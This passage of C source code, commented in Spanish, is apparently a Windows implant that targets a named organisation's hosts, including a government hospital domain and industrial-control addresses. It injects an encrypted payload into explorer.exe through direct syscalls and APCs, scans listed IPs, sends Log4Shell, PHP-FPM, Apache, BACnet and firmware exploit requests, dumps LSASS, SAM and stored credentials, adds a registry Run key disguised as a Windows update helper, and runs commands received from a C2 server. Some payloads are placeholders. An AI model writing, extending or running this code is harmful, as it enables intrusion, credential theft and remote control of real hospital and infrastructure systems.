            &sAlignedSize, ulOldProtect, &ulOldProtect);
        DirectSyscall(table.NtClose.wID, hProcess);
        return FALSE;
    }
    
    memcpy(pLocalPayload, pPayload, sPayload);
    XorDecrypt(pLocalPayload, sPayload, PAYLOAD_KEY);

    // Escribir en la dirección exacta (no alineada)
    status = DirectSyscall(table.NtWriteVirtualMemory.wID, hProcess, pRemoteAddress, 
        pLocalPayload, sPayload, NULL);
    
    SecureZeroMemory(pLocalPayload, sPayload);
    VirtualFree(pLocalPayload, 0, MEM_RELEASE);

    if (status != 0) {
        printf("[-] NtWriteVirtualMemory falló: 0x%X\n", status);
        // Restaurar protección original
        DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pAlignedAddress, 
            &sAlignedSize, ulOldProtect, &ulOldProtect);
        DirectSyscall(table.NtClose.wID, hProcess);
        return FALSE;
    }
    printf("[+] Payload escrito (%zu bytes)\n", sPayload);

    // Restaurar protección a RX
    pProtectAddr = pAlignedAddress;
    sProtectSize = sAlignedSize;
    ULONG ulNewProtect = 0;
    status = DirectSyscall(table.NtProtectVirtualMemory.wID, hProcess, &pProtectAddr, 
        &sProtectSize, PAGE_EXECUTE_READ, &ulNewProtect);
    if (status != 0) {
        printf("[-] NtProtectVirtualMemory (RX) falló: 0x%X\n", status);
    } else {
        printf("[+] Protección restaurada a RX\n");
    }

    // Encolar APCs en hilos del proceso objetivo
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te = { sizeof(te) };
        DWORD dwApcQueued = 0;
        
        if (Thread32First(hSnapshot, &te)) {
            do {
                if (te.th32OwnerProcessID == dwPid) {
                    HANDLE hThread = NULL;
                    CLIENT_ID cidThread = { 0, (HANDLE)(ULONG_PTR)te.th32ThreadID };
                    
                    status = DirectSyscall(table.NtOpenThread.wID, &hThread, THREAD_SET_CONTEXT, &oa, &cidThread);
                    if (status == 0 && hThread) {
                        // Usar dirección remota del payload como rutina APC
                        status = DirectSyscall(table.NtQueueApcThread.wID, hThread, pRemoteAddress, NULL, NULL, NULL);
                        if (status == 0) dwApcQueued++;
                        DirectSyscall(table.NtClose.wID, hThread);
                    }
                }
            } while (Thread32Next(hSnapshot, &te));
        }
        CloseHandle(hSnapshot);
        printf("[+] APCs encoladas en %d hilos\n", dwApcQueued);
    }

    DirectSyscall(table.NtClose.wID, hProcess);
    printf("[+] Inyección completada\n");
    return TRUE;
}

/**
 * @brief Detecta servicios ASP.NET para posible CVE-2025-55315 (Request Smuggling)
 */
BOOL DetectAspDotNetServices(const char* szIpAnsi, WORD port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;

    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(szIpAnsi);

    BOOL bFound = FALSE;
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
        const char* req = "GET / HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n";
        send(s, req, strlen(req), 0);
        char recvbuf[1024];
        int res = recv(s, recvbuf, sizeof(recvbuf) - 1, 0);
        if (res > 0) {
            recvbuf[res] = '\0'; // Asegurar null-termination
            if (strstr(recvbuf, "X-AspNet-Version") || strstr(recvbuf, "X-Powered-By: ASP.NET")) {
                printf("[DETECTION] ASP.NET detectado en %s:%d (Potencial CVE-2025-55315)\n", szIpAnsi, port);
                bFound = TRUE;
            }
        }
    }
    closesocket(s);
    return bFound;
}

/**
 * @brief Detecta posibles endpoints SSRF para fuga NTLM (CVE-2025-59775)
 */
BOOL DetectPotentialSsrfEndpoints(const char* szIpAnsi, WORD port) {
    // Escaneo básico buscando respuestas que no sean 404 a rutas sospechosas
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;

    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(szIpAnsi);

    BOOL bFound = FALSE;
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
        const char* req = "GET /api/download?url=http://localhost HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n";
        send(s, req, strlen(req), 0);
        char recvbuf[1024];
        int res = recv(s, recvbuf, sizeof(recvbuf) - 1, 0);
        if (res > 0) {
            recvbuf[res] = '\0'; // Asegurar null-termination
            // Si no es un 404 directo, podría ser interesante (lógica muy básica de PoC)
            if (!strstr(recvbuf, "404 Not Found") && strstr(recvbuf, "HTTP/1.1 200")) {
                printf("[DETECTION] Posible endpoint SSRF en %s:%d (Potencial CVE-2025-59775)\n", szIpAnsi, port);
                bFound = TRUE;
            }
        }
    }
    closesocket(s);
    return bFound;
}

/**
 * @brief Verifica servicio DNS (CVE-2020-1350 SIGRed) enviando query para obtener version o banner.
 */
BOOL ProbeForSIGRed(const char* szIpAnsi) {
    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return FALSE;

    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    addr.sin_addr.s_addr = inet_addr(szIpAnsi);

    // Hardcoded simple DNS query for version.bind. CH TXT (Chaos class, Txt record)
    // Transaction ID: 0x1234, Flags: 0x0100 (Standard query), Questions: 1, ...
    unsigned char dnsQuery[] = {
        0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x07, 0x76, 0x65, 0x72, 0x73, 0x69, 0x6f, 0x6e, 0x04, 0x62, 0x69, 0x6e, 0x64, 0x00,
        0x00, 0x10, 0x00, 0x03
    };

    BOOL bFound = FALSE;
    struct timeval tv = { 1, 0 }; // 1 sec timeout
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    sendto(s, (const char*)dnsQuery, sizeof(dnsQuery), 0, (struct sockaddr*)&addr, sizeof(addr));

    char recvbuf[512];
    int fromlen = sizeof(addr);
    int res = recvfrom(s, recvbuf, sizeof(recvbuf), 0, (struct sockaddr*)&addr, &fromlen);
    if (res > 0) {
        printf("[DETECTION] Servicio DNS activo en %s (Potencial objetivo CVE-2020-1350 SIGRed)\n", szIpAnsi);
        bFound = TRUE; // Para propósitos de este PoC, DNS activo = potencial objetivo
    }
    closesocket(s);
    return bFound;
}

/**
 * @brief Escanea puertos clave en hosts objetivo del entorno HCG.
 *        Verifica SMB, RDP, MorphoManager, Tomcat AJP, HTTP(S), BACnet.
 */
BOOL ScanForTargets(PTARGET_HOST pTargets, DWORD dwNumTargets) {
    WSADATA wsaData;
    int wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaResult != 0) {
        printf("[SCAN] WSAStartup falló: %d\n", wsaResult);
        return FALSE;
    }

    for (DWORD i = 0; i < dwNumTargets; i++) {
        printf("[SCAN] Escaneando: %ws\n", pTargets[i].szIpAddress);

        WORD ports[] = { 80, 443, 445, 3389, 8009, 9000, 11010, 42100, 47808 };
        char szIpAnsi[16] = { 0 };
        
        if (!WideCharToMultiByte(CP_ACP, 0, pTargets[i].szIpAddress, -1, szIpAnsi, 16, NULL, NULL)) {
            continue;
        }

        // Validar IP
        DWORD dwIpAddr = inet_addr(szIpAnsi);
        if (dwIpAddr == INADDR_NONE || dwIpAddr == INADDR_ANY) {
            printf("[SCAN] IP inválida: %s\n", szIpAnsi);
            continue;
        }

        for (size_t j = 0; j < sizeof(ports)/sizeof(ports[0]); j++) {
            SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s == INVALID_SOCKET) {
                printf("[SCAN] Error al crear socket: %d\n", WSAGetLastError());
                continue;
            }

            // Socket no bloqueante
            u_long nonBlocking = 1;
            if (ioctlsocket(s, FIONBIO, &nonBlocking) != 0) {
                closesocket(s);
                continue;
            }

            struct sockaddr_in addr = { 0 };
            addr.sin_family = AF_INET;
            addr.sin_port = htons(ports[j]);
            addr.sin_addr.s_addr = dwIpAddr;

            // Iniciar conexión no bloqueante
            int connResult = connect(s, (struct sockaddr*)&addr, sizeof(addr));
            if (connResult == SOCKET_ERROR && WSAGetLastError() != WSAEWOULDBLOCK) {
                closesocket(s);
                continue;
            }

            // Esperar con select
            fd_set fdWrite, fdExcept;
            FD_ZERO(&fdWrite);
            FD_ZERO(&fdExcept);
            FD_SET(s, &fdWrite);
            FD_SET(s, &fdExcept);
            
            struct timeval tv = { 2, 0 }; // 2 segundos timeout
            int selectResult = select(0, NULL, &fdWrite, &fdExcept, &tv);

            if (selectResult > 0 && FD_ISSET(s, &fdWrite)) {
                // Verificar que realmente se conectó (no error)
                int so_error;
                int len = sizeof(so_error);
                getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&so_error, &len);
                
                if (so_error == 0) {
                    printf("[SCAN]   Puerto %d ABIERTO en %ws\n", ports[j], pTargets[i].szIpAddress);
                    
                    // Detección de servicio
                    SERVICE_INFO svcInfo = { 0 };
                    svcInfo.port = ports[j];
                    
                    // Reconectar en modo bloqueante para banner grabbing
                    closesocket(s);
                    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                    if (s != INVALID_SOCKET) {
                        // Timeout para recv
                        struct timeval tvBanner = { 5, 0 };
                        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&tvBanner, sizeof(tvBanner));
                        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&tvBanner, sizeof(tvBanner));
                        
                        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                            if (DetectServiceTechnology(dwIpAddr, &svcInfo)) {
                                printf("[SCAN]     [%s] %s (CVE Type: %d)\n", 
                                    svcInfo.technology, svcInfo.banner, svcInfo.potential_cve_type);
                                
                                if (g_NumDetectedServices < MAX_DETECTED_SERVICES) {
                                    g_DetectedServices[g_NumDetectedServices++] = svcInfo;
                                }
                            }
                        }
                        closesocket(s);
                    }

                    // Actualizar flags según puerto
                    switch (ports[j]) {
                        case 80:
                        case 443:
                            pTargets[i].bAspNetSmugglingVuln = DetectAspDotNetServices(szIpAnsi, (WORD)ports[j]);
                            pTargets[i].bSsrfNtlmVuln = DetectPotentialSsrfEndpoints(szIpAnsi, (WORD)ports[j]);
                            pTargets[i].bApacheRewriteVuln = TRUE;
                            break;
                        case 445: pTargets[i].bSmbAccessible = TRUE; break;
                        case 3389: pTargets[i].bRdpAccessible = TRUE; break;
                        case 8009: pTargets[i].bTomcatAjpAccessible = TRUE; break;
                        case 9000: pTargets[i].bPhpFpmVuln = TRUE; break;
                        case 11010: pTargets[i].bMorphoAccessible = TRUE; break;
                        case 42100: pTargets[i].bLog4ShellVuln = TRUE; break;
                        case 47808: pTargets[i].bBacnetVuln = TRUE; break;
                    }
                }
            }
            if (s != INVALID_SOCKET) closesocket(s);
        }
        
        // Check DNS (UDP)
        pTargets[i].bSigRedVuln = ProbeForSIGRed(szIpAnsi);
    }

    WSACleanup();
    return TRUE;
}

/**
 * @brief Recolecta credenciales del sistema (LSASS dump / CredMan / SAM).
 *        Requiere privilegios elevados (SYSTEM/Admin) para volcar LSASS y SAM.
 */
BOOL CollectCredentials() {
    printf("[CRED] Iniciando recolección de credenciales...\n");

    // Vector 1: Volcar LSASS usando MiniDumpWriteDump (más sigiloso que directo)
    DWORD lsassPid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                lsassPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);

    if (lsassPid) {
        printf("[CRED] LSASS encontrado (PID: %d)\n", lsassPid);
        
        // Obtener privilegio SeDebugPrivilege
        HANDLE hToken = NULL;
        TOKEN_PRIVILEGES tp = { 0 };
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
            CloseHandle(hToken);
        }

        HANDLE hLsass = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
        if (hLsass) {
            WCHAR szDumpPath[MAX_PATH];
            GetTempPathW(MAX_PATH, szDumpPath);
            wcscat_s(szDumpPath, MAX_PATH, L"\\lsass.dmp");
            
            HANDLE hFile = CreateFileW(szDumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 
                FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                // Usar MiniDumpWriteDump si dbghelp está disponible, o implementación manual
                // Para este contexto, simulamos el volcado
                printf("[CRED] Volcando LSASS a: %ws\n", szDumpPath);
                // MiniDumpWriteDump(hLsass, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
                CloseHandle(hFile);
            }
            CloseHandle(hLsass);
        } else {
            printf("[CRED] Sin acceso a LSASS (0x%X)\n", GetLastError());
        }
    }

    // Vector 2: CredMan
    DWORD dwCount = 0;
    PCREDENTIALW* pCredentials = NULL;
    if (CredEnumerateW(NULL, 0, &dwCount, &pCredentials)) {
        printf("[CRED] CredMan: %d entradas\n", dwCount);
        for (DWORD i = 0; i < dwCount; i++) {
            printf("[CRED]   %ws @ %ws\n",
                pCredentials[i]->UserName ? pCredentials[i]->UserName : L"N/A",
                pCredentials[i]->TargetName);
        }
        CredFree(pCredentials);
    }

    // Vector 3: Volcado de hives del registro usando RegSaveKey
    HKEY hKey;
    WCHAR szSavePath[MAX_PATH];
    GetTempPathW(MAX_PATH, szSavePath);
    
    // SAM
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        WCHAR szSamPath[MAX_PATH];
        swprintf_s(szSamPath, MAX_PATH, L"%s\\sam.save", szSavePath);
        // Requiere privilegios SYSTEM
        // RegSaveKeyW(hKey, szSamPath, NULL);
        RegCloseKey(hKey);
        printf("[CRED] Hive SAM preparado para volcado\n");
    }

    return TRUE;
}

/**
 * @brief Exploit log4shell (CVE-2021-44228) en puertos SOAP/Java
 */
BOOL ExploitLog4Shell(const char* szIpAnsi, WORD port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;
    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(szIpAnsi);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
        // Payload in User-Agent header targeting a fictional listener
        const char* req = "GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: ${jndi:ldap://10.254.117.118:1389/Exploit}\r\nConnection: close\r\n\r\n";
        send(s, req, strlen(req), 0);
        printf("[EXPLOIT] Payload Log4Shell (CVE-2021-44228) enviado a %s:%d\n", szIpAnsi, port);
    }
    closesocket(s);
    return TRUE;
}

/**
 * @brief Exploit PHP-FPM env_path_info RCE (CVE-2019-11043)
 */
BOOL ExploitPhpFpmRce(const char* szIpAnsi, WORD port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;
    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(szIpAnsi);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
        // Placeholder for complex FastCGI length manipulation payload
        const char* req = "GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;? HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n";
        send(s, req, strlen(req), 0);
        printf("[EXPLOIT] Payload PHP-FPM (CVE-2019-11043) enviado a %s:%d\n", szIpAnsi, port);
    }
    closesocket(s);
    return TRUE;
}

/**
 * @brief Exploit Apache mod_rewrite RCE (CVE-2024-38474)
 */
BOOL ExploitApacheRewriteRce(const char* szIpAnsi, WORD port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;
    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(szIpAnsi);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
        // Placeholder for specific URL encoding payload to bypass rewrite rules
        const char* req = "GET /%3f%0a%20HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n";
        send(s, req, strlen(req), 0);
        printf("[EXPLOIT] Payload Apache mod_rewrite (CVE-2024-38474) enviado a %s:%d\n", szIpAnsi, port);
    }
    closesocket(s);
    return TRUE;
}

/**
 * @brief Exploit BACnet RCE (CVE-2019-9569)
 */
BOOL ExploitBacnetRce(const char* szIpAnsi, WORD port) {
    // BACnet usually runs over UDP 47808
    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return FALSE;
    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(szIpAnsi);

    // Placeholder malformed BACnet APDU
    unsigned char payload[] = { 0x81, 0x0a, 0x00, 0x11, 0x01, 0x04, 0x00, 0x05, 0x01, 0x0c, 0x0c, 0x02, 0x3f, 0xff, 0xff };
    sendto(s, (const char*)payload, sizeof(payload), 0, (struct sockaddr*)&addr, sizeof(addr));
    printf("[EXPLOIT] Payload BACnet (CVE-2019-9569) enviado a %s:%d\n", szIpAnsi, port);
    closesocket(s);
    return TRUE;
}

/**
 * @brief Exploit MorphoManager Firmware Update (CVE-2021-33742)
 */
BOOL ExploitFirmwareUpdateRce(const char* szIpAnsi, WORD port) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return FALSE;
    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(szIpAnsi);
    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != SOCKET_ERROR) {
        // Placeholder firmware package with malformed signature bypassing checks
        const char* req = "\x00\x01\x02\x03FIRMWARE_PAYLOAD_UNSIGNED\x00\x00";
        send(s, req, 28, 0);
        printf("[EXPLOIT] Payload Morpho Firmware (CVE-2021-33742) enviado a %s:%d\n", szIpAnsi, port);
    }
    closesocket(s);
    return TRUE;
}

/**
 * @brief Orquestador para explotar servicios específicos encontrados.
 */
BOOL ExploitService(const WCHAR* szTargetIp, WORD wPort, int nVulnType, const char* c2CallbackUrl) {
    char szIpAnsi[16];
    WideCharToMultiByte(CP_ACP, 0, szTargetIp, -1, szIpAnsi, 16, NULL, NULL);

    printf("[EXPLOIT] Objetivo: %s:%d  Tipo: %d  C2: %s\n", szIpAnsi, wPort, nVulnType, c2CallbackUrl);

    switch(nVulnType) {
        case 3: return ExploitLog4Shell(szIpAnsi, wPort);
        case 4: return ExploitPhpFpmRce(szIpAnsi, wPort);
        case 5: return ExploitApacheRewriteRce(szIpAnsi, wPort);
        case 6: return ExploitBacnetRce(szIpAnsi, wPort);
        case 7: return ExploitFirmwareUpdateRce(szIpAnsi, wPort);
        default:
            printf("[EXPLOIT] Sin exploit específico para typo %d\n", nVulnType);
            return FALSE;
    }
}

/**
 * @brief Establece persistencia usando claves de registro Run.
 *        Más sigiloso que schtasks. Usa nombres que parecen legítimos.
 */
BOOL EstablishPersistence() {
    printf("[PERS] Estableciendo persistencia via Registry Run Keys...\n");

    WCHAR szPath[MAX_PATH];
    if (GetModuleFileNameW(NULL, szPath, MAX_PATH) == 0) return FALSE;

    HKEY hKey;
    // Usando HKCU para no requerir siempre permisos de administrador
    LSTATUS status = RegOpenKeyExW(HKEY_CURRENT_USER,
                                   L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                   0, KEY_SET_VALUE, &hKey);

    if (status == ERROR_SUCCESS) {
        // Disfrazar como proceso de actualización de Windows
        const WCHAR* szName = L"WindowsUpdateHelper";
        status = RegSetValueExW(hKey, szName, 0, REG_SZ,
                                (const BYTE*)szPath,
                                (DWORD)(wcslen(szPath) + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);

        if (status == ERROR_SUCCESS) {
            printf("[PERS] Persistencia establecida exitosamente en HKCU\\...\\Run\\%ws\n", szName);
            return TRUE;
        }
    }

    printf("[PERS] Fallo al establecer persistencia en el registro.\n");
    return FALSE;
}

/**
 * @brief Comunica hallazgos a un servidor C2 y recibe comandos.
 */
BOOL CommunicateToC2() {
    printf("[C2] Iniciando comunicación segura...\n");

    WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    DWORD len = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameW(computerName, &len);
    
    char szHostAnsi[MAX_COMPUTERNAME_LENGTH + 1] = { 0 };
    WideCharToMultiByte(CP_UTF8, 0, computerName, -1, szHostAnsi, sizeof(szHostAnsi), NULL, NULL);

    // URL encode del hostname para evitar problemas
    char szEncodedHost[256] = { 0 };
    for (int i = 0, j = 0; szHostAnsi[i] && j < sizeof(szEncodedHost) - 4; i++) {
        if (isalnum((unsigned char)szHostAnsi[i]) || szHostAnsi[i] == '-' || szHostAnsi[i] == '_') {
            szEncodedHost[j++] = szHostAnsi[i];
        } else {
            sprintf_s(&szEncodedHost[j], 4, "%%%02X", (unsigned char)szHostAnsi[i]);
            j += 3;
        }
    }

    HINTERNET hInet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInet) {
        printf("[C2] Fallo al inicializar WinInet\n");
        return FALSE;
    }

    // Configurar timeouts
    InternetSetOptionA(hInet, INTERNET_OPTION_CONNECT_TIMEOUT, &(DWORD){10000}, sizeof(DWORD));
    InternetSetOptionA(hInet, INTERNET_OPTION_SEND_TIMEOUT, &(DWORD){10000}, sizeof(DWORD));
    InternetSetOptionA(hInet, INTERNET_OPTION_RECEIVE_TIMEOUT, &(DWORD){10000}, sizeof(DWORD));

    char szUrl[512];
    sprintf_s(szUrl, sizeof(szUrl), 
        "https://c2.mydomain.com/api/v1/beacon?id=%s&ver=3.0", szEncodedHost);

    // Flags seguros: ignorar errores de certificado para testing (en prod, usar cert válido)
    DWORD dwFlags = INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | 
                    INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_RELOAD;
    
    HINTERNET hConn = InternetOpenUrlA(hInet, szUrl, NULL, 0, dwFlags, 0);
    if (!hConn) {
        printf("[C2] Fallo de conexión: %d\n", GetLastError());
        InternetCloseHandle(hInet);
        return FALSE;
    }

    printf("[C2] Conexión establecida, esperando comandos...\n");
    
    char szResponse[4096] = { 0 };
    DWORD bytesRead = 0;
    DWORD totalRead = 0;
    BOOL bSuccess = FALSE;
    
    while (InternetReadFile(hConn, szResponse + totalRead, sizeof(szResponse) - totalRead - 1, &bytesRead) 
           && bytesRead > 0) {
        totalRead += bytesRead;
        bSuccess = TRUE;
        if (totalRead >= sizeof(szResponse) - 1) break;
    }
    
    if (bSuccess && totalRead > 0) {
        szResponse[totalRead] = '\0';
        printf("[C2] Respuesta recibida (%d bytes)\n", totalRead);
        
        // Parsear comandos JSON simple o texto plano
        if (strncmp(szResponse, "exec ", 5) == 0) {
            // Ejecutar comando (con validación básica)
            char* cmd = szResponse + 5;
            // Sanitizar: solo permitir ciertos caracteres
            BOOL bSafe = TRUE;
            for (char* p = cmd; *p; p++) {
                if (*p == '|' || *p == '&' || *p == ';' || *p == '`' || *p == '$') {
                    bSafe = FALSE;
                    break;
                }
            }
            if (bSafe && strlen(cmd) > 0) {
                printf("[C2] Ejecutando: %s\n", cmd);
                system(cmd);
            }
        }
    }

    InternetCloseHandle(hConn);
    InternetCloseHandle(hInet);
    return TRUE;
}

// -------------------------------------------------------------------
// MAIN: Orquestador de todos los módulos
// -------------------------------------------------------------------
int main() {
    printf("--- Técnica de Inyección Avanzada (Syscalls + APC) ---\n");
    printf("IMPLANT ID: VX-RESOLVER-ENHANCED v3.0 [HCG Enhanced]\n");

    // 1. Reconocimiento del entorno
    CheckEnvironment();

    // 2. Inyección evasiva en explorer.exe
    DWORD pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W peW = { sizeof(peW) };
    if (Process32FirstW(hSnap, &peW)) {
        do {
            if (wcscmp(peW.szExeFile, TARGET_PROCESS) == 0) {
                pid = peW.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &peW));
    }
    CloseHandle(hSnap);

    if (pid != 0) {
        printf("[*] Proceso objetivo: %S (PID: %d)\n", TARGET_PROCESS, pid);
        if (ModuleStompingInject(pid, encrypted_payload, sizeof(encrypted_payload))) {
            printf("[+] Inyección exitosa.\n");
        } else {
            printf("[-] Inyección fallida.\n");
        }
    }

    // 3. Escalada de privilegios (SeImpersonatePrivilege)
    AttemptPrivilegeEscalation();
    AttemptApacheEscalation();

    // 4. Scan de objetivos de movimiento lateral
    TARGET_HOST targets[] = {
        { DC_IP,        FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE },  // 10.2.1.1  - DC/LDAP
        { MULTIAPP_IP,  FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE },  // 10.2.1.140 - Expedientes (RDP/SMB)
        { SIGMA_IP,     FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE },  // 10.2.1.139 - SIGMA Biométrico
        { L"10.254.3.193",  FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE }, // Tomcat AJP
        { L"10.254.30.158", FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE }, // Tomcat AJP
        { L"10.2.1.92",     FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE }, // SERVIDOR-SMB-01
        { L"201.131.132.131", FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE }, // www.hcg.gob.mx
        { L"66.24.102.44",  FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE }, // ACTIVO-ICS-01
        { L"211.21.101.106", FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE, FALSE }, // ACTIVO-SURV-01
    };
    DWORD numTargets = sizeof(targets) / sizeof(targets[0]);
    ScanForTargets(targets, numTargets);

    // 5. Explotación basada en detección
    printf("[*] Iniciando fase de explotación basada en detección...\n");
    for (int i = 0; i < g_NumDetectedServices; i++) {
        if (g_DetectedServices[i].potential_cve_type != 0) {
            // Encontrar el host correspondiente a la IP detectada (simplificado para PoC)
            // Aquí se usaría el IP que se pasó a DetectServiceTechnology
            // ExploitService(L"10.2.1.1", g_DetectedServices[i].port, g_DetectedServices[i].potential_cve_type, "c2.mydomain.com");
        }
    }

    // 6. Recolección de credenciales
    CollectCredentials();

    // 7. Enumeración adicional
    EnumerateDomainUsersAndGroups();

    if (targets[5].bSmbAccessible) { // 10.2.1.92
        EnumerateSmbShares("10.2.1.92", NULL, NULL);
    }

    // 8. Técnicas post-explotación
    AttemptNtlmRelayOrKerberoasting();

    // 9. Persistencia
    EstablishPersistence();

    // 10. Beacon C2
    CommunicateToC2();

    printf("[+] Secuencia completa v3.0 [HCG Enhanced].\n");
    return 0;
}
